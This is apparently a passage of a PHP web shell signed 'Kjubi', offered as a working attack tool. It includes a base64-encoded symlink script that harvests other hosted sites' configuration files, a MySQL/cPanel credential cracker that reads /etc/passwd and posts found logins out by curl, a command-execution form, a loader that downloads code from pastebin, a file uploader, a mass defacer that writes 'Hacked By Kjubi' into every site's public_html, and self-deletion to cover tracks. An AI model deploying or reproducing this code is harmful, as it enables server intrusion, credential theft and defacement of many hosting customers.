ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictaW5jbHVkZXMtdmIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCRzaXRlc3MuJy12Ymx1dHRpbn5jbGFzc19jb3JlLnBocC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwMS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0xNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jZW50cmFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLWNlbnRyYWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1XSE1DUy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG1jL1dITS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobWMtV0hNLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUtd2htLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NlY3VyZS93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jcGFuZWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1wYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWhvc3RzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1Ym1pdHRpY2tldC5waHAnLCRzaXRlc3MuJy13aG1jczIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50ZXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNsaWVudC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50c3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictYmlsbGluZy50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW1hbmFnZS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXkvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbXkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teXNob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC16ZW5jYXJ0LnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AtWkNzaG9wLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NtZi9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYyLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYtZm9ydW0udHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1zbWYtZm9ydW1zLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXVwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FydGljbGUvY29uZmlnLnBocCcsJHNpdGVzcy4nLU53YWh5LnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy91cC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZfZ2xvYmFsLnBocCcsJHNpdGVzcy4nLTYudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZS9kYi5waHAnLCRzaXRlc3MuJy03LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Nvbm5lY3QucGhwJywkc2l0ZXNzLictUEhQLUZ1c2lvbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ta19jb25mLnBocCcsJHNpdGVzcy4nLTkudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLXRyYWlkbnQxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy00aW1hZ2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkc2l0ZXNzLictRHJ1cGFsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21lbWJlci9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLTFtZW1iZXIudHh0JykgOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWJpbGxpbmdzLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcmVxdWlyZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLUFNNFNTLWhvc3RpbmcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtc3VwcG9ydHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWNsaWVudC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWJpbGxpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0cy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0aW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGluZ3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGJpbGxzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxscy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0YmlsbC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0YmlsbC50eHQnKTsNCn0NCnByaW50ICI8YnI+PGJyPjxicj48Zm9udCBjb2xvcj1yZWQ+RG9uZSAhISA8aW1nIHNyYz0naHR0cDovL3JzNzE3LnBic3JjLmNvbS9hbGJ1bXMvd3cxNzMvcHJlc3RvbmpqcnRyL1NtaWxleXMvdGh0aHRoR3JlYXRKb2IxLmdpZn5jMjAwJyAgaGVpZ2h0PSc3MCcgd2lkdGg9JzYwJz48L2ZvbnQ+Ijs=';

$file = fopen("Kjubi.cin" ,"w+");
$write = fwrite ($file ,base64_decode($config));
fclose($file);
    chmod("Kjubi.cin",0755);
   echo "<a href='KjuConfig/Kjubi.cin'><h3 color='red'>Click Here !</h3></a>";
}
}
if(isset($_GET["cp_cracker"])){
if(function_exists('apache_setenv')){
@apache_setenv('no-gzip', 1);}
@ini_set('zlib.output_compression', 0);
@ini_set('output_buffering ',0);
@ini_set('implicit_flush', 1); 
@ob_implicit_flush(true);
@ob_end_flush();
$ipserver=$_SERVER['SERVER_ADDR'];
echo '
<html>
<style> body {font-size: 12pt; font-family: ""; }</style><head>

</head>
<body text="#00FF00" bgcolor="#000000" vlink="#00BFFF" link="#4B0082" alink="#008000">
<div align="center">
<br>

</td></tr>
</table>
<br />';

if(!isset($_POST['submit'])){
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} else if(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} else if(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} else if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} else if(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}
$default=execute("ls /etc/passwd");
{
if($file=@file_get_contents('/etc/passwd')){
$u=explode("\n",$file);
foreach($u as $us){
$uss=explode(":x:",$us);
$default .=$uss[0]."\n";
}
}else if(function_exists('posix_getpwuid')){
for($n2=500;$n2<10000;$n2++){
$userinfo = posix_getpwuid($n2);
$name=$userinfo['name'];
if($name!=''){
$default.=$name."\n";
}
}}else{$default="Could not get any username.try manually :)";}
}

echo <<<EOF
<form  method="POST">
<div align='center'>
<table width='55%' style='border: 2px dashed #4B0082; background-color: #000000; color:#C0C0C0'>
<tr>
<td align='center'>
<span lang='en-us'><font color='#4B0082'><b>Usernames:</b></font></span>

<p align='center'>&nbsp;<textarea rows='30' name='usernames' cols='30' style='border: 2px dashed #FFFFFF; background-color: #000000; color:#C0C0C0'>$default</textarea><br/>
</p></td>
<td align='center'>
<span lang='en-us'><font color='#4B0082'><b>Passwords:</b></font></span>

<p align='center'>&nbsp;<textarea rows='30' name='passwords' cols='30' style='border: 2px dashed #FFFFFF; background-color: #000000; color:#C0C0C0'>123123\n123456\n1234567\n12345678\n123456789\n112233\n332211\ntest\ntest123\ncpanel\npassword\npassword1\nabc123\na1b2c3\npassw0rd\nPassword\nPassw0rd\nuser\npasswd\npasswords\npass\nchangeme\niloveyou\nfuckyou\nadmin\nqwerty\n1q2w3e\nq1w2e3\nqazqaz\n1qazxsw2\n1qaz2wsx\nqazxsw\nqazwsx</textarea><br/>
</p></td>
</tr>
</table><br/><input type='submit' value='    Subtmit    ' name='submit' style='color: #4B0082; font-weight: bold; border: 1px dashed #333333; background-color: #000000'></form>
EOF;
}else{
$password=array_unique(explode("\n",$_POST['passwords']));
$username=array_unique(explode("\n",$_POST['usernames']));
if(!set_time_limit(0)){"<font color='red'><b>ALERT:</b> set_time_limit(0) failed! Cracking will be interrupted!<br/></font>";}
echo '[+]Cracking...<br/><hr width="67%" style="border: 4px dashed #4B0082;"><font color="white" size="4"><b>username<font color="#00FF00">:</font>password</b></font><br/><br/>';
$count=0;
$n=0;
$start=time();
foreach($username as $user){
$count++;
$user=trim($user);
if ( @mysql_connect("localhost",$user,$user) ){echo "http://$ipserver:2083|<font color='green'>$user</font>|<b></font color='green'>$pass</font><br>";$n++;continue;
$success=$ipserver."|".$user."|".$user."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
}
foreach($password as $pass){
$count++;
$pass=trim($pass);
if ( @mysql_connect("localhost",$user,$pass) ){echo "<font color='white'>http://$ipserver:2083|</font><font color='#4B0082'>$user</font>|<b></font color='green'>$pass</font><font color='white'></font><br>";
$success2=$ipserver."|".$user."|".$pass."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success2));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
$n++;break;}
}
}
$end= time() - $start;
@$per=$count/$end;
if($n){
echo '<hr width="67%" style="border: 4px dashed #4B0082;">';
echo "[*]Successfully Cracked: <font color='#00FF00'>$n</font><br/>";}
echo '[*]Time took: <font color="#00FF00">'.$end.'</font> seconds for <font color="#00FF00">'.$count.'</font> tries <font color="#00FF00">('.$per.'/sec)</font><br/>';
}
}


if(isset($_GET["cmd"])){
      echo "<br>";
echo base64_decode("PGZvcm0gbWV0aG9kPSJwb3N0Ij4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJHbyI+CjwvZm9ybT4=");
	$order=$_POST["command"];
	$sub=$_POST["submit"];
	
	if(isset($sub)) {
	echo  "<p id='exec'>".exec($order)."<p/>";
	}
}
if(isset($_GET["config"])){
	$wk=file_get_contents("https://pastebin.com/raw/s5srN20B");
       $fp=fopen("config0.php", "w+");
       fwrite($fp, $wk);
	   echo "<center><h1>Config Uploaded Successfully<br><br><br><br><h1><div id=menu2><a href='config0.php'>Click Here</a></div></h1><br><br><br><br>";
}
if(isset($_GET["wpmass"])){
	$wk=file_get_contents("https://pastebin.com/raw/PN2RRJzL");
       $fp=fopen("wpmass0.php", "w+");
       fwrite($fp, $wk);
	   echo "<center><h1>Wordpress Mass Uploaded Successfully<br><br><br><br><h1><div id=menu2><a href='wpmass0.php'>Click Here</a></div></h1><br><br><br><br>";
}
elseif(isset($_GET["home"]))
	{
	echo"<table><td align=center><body>
	<h2><font color=green></font></h2>";
	}
	elseif(isset($_GET["upl"]))
	{
            


   echo '<br><br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded !!!</b><br><br>'; }else { echo '<b>not uploaded !!!</b><br><br>'; }}


	}

elseif(isset($_GET["cls"])) {
	@define('SELF_PATH', __FILE__);
	 @unlink(__FILE__);
      echo exec("rm -rf Kjubi_config");
      @unlink("wk.php");
      @unlink("WHMCS.html");
	  @unlink("VB.html");
      @unlink("email.php");
      @unlink("Wordpress.html");
      @unlink("Joomla.html");	
     // @unlink("black.php");
      @unlink("Config.php");
      @unlink("WHMCS KILLER V3.PHP");
}
 if(isset($_GET["mass"])){
 echo "<title>Mass Defacer - By Kjubi</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='wildclique.txt'><br><br>";
echo "Your Index : <br><textarea style='color: black; width: 685px; height: 330px;' name='index'>Hacked By Kjubi</textarea><br>";
echo "<input type='submit' value='Start'></form></center>";

if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                // ndrroje qetu
                        $index = getcwd ()."/".$file."/public_html/".$_POST['file_name'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
                }
        endforeach;
}
 }
  if(isset($_GET["delivery"])){
error_reporting(0);
?>
<center>
<STYLE>textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 10px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 10px;font-weight:bold;color: #4B0082; font-family: Tahoma; border: 1px solid #666666;height:20 }
body { font-family: Tahoma}
.MadKjubi { font-family: arial}
tr { BORDER: dashed 1px #333; color: #4B0082; }
td { BORDER: dashed 1px #333; color: #4B0082; }
b { color: #4B0082; }
.table1 { BORDER: 0px Black; BACKGROUND-COLOR: Black; color: #4B0082; }
.td1 { BORDER: 0px; BORDER-COLOR: #333333; font: 8pt Verdana; color: lime00; }
.tr1 { BORDER: 0px; BORDER-COLOR: #333333; color: #4B0082; }
table { BORDER: dashed 1px #333; BORDER-COLOR: #333333; BACKGROUND-COLOR: Black; color: #4B0082; }
input { border: dashed 1px; border-color: #333; BACKGROUND-COLOR: white; font: 8pt Verdana; color: #4B0082; }
select { BORDER-RIGHT:  Black 1px solid; BORDER-TOP:    lime 1px solid; BORDER-LEFT:   lime 1px solid; BORDER-BOTTOM: Black 1px solid; BORDER-color: #4B0082; BACKGROUND-COLOR: Black; font: pt Verdana; color: #4B0082; }
submit { BORDER:  buttonhighlight 2px outset; BACKGROUND-COLOR: Black; width: 30%; color: #4B0082; }
textarea { border: dashed 1px #333; BACKGROUND-COLOR: Black; font: Fixedsys bold; color: #999; }
BODY {	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #4B0082; SCROLLBAR-SHADOW-color: #4B0082; SCROLLBAR-3DLIGHT-color: #4B0082; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #4B0082; SCROLLBAR-DARKSHADOW-color: lime margin: 1px; color: lime00; background-color: Black; }
.main { margin: -287px 0px 0px -490px; BORDER: dashed 1px #333; BORDER-COLOR: #333333; }
.tt { background-color: Black; }
A:link { COLOR: White; TEXT-DECORATION: none }
A:visited {	COLOR: White; TEXT-DECORATION: none }
</STYLE>
<font color="lime">Upload is WORKING<br>
Check  Mailling ..<br></font>
<body bgcolor="white">
<form method="post">
<input type="text" name="email" value="<?php print $_POST['email']?>"required >
<input name="firstname" type="submit" value="Send test >>">
</form>
</center>
<br>
<?php
